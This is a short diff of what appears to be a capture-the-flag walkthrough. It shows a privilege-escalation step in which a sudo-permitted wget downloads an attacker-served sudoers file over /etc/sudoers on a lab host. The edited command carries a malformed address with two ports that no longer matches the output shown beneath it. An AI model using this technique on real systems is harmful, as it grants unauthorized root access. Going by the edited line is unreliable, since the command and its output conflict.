@@ -283,7 +283,7 @@ sudo /usr/bin/wget 10.10.91.4:9001/sudoer --output-document=sudoers
 
 - you should get this at Jessie shell:
 ```
-jessie@CorpOne:/etc$ sudo /usr/bin/wget 10.10.148.110:80/sudoers --output-document=sudoers
+jessie@CorpOne:/etc$ sudo /usr/bin/wget 10.10.91.4:9001:80/sudoers --output-document=sudoers
 --2020-04-24 15:40:57--  http://10.10.148.110/sudoers
 Connecting to 10.10.148.110:80... connected.
 HTTP request sent, awaiting response... 200 OK
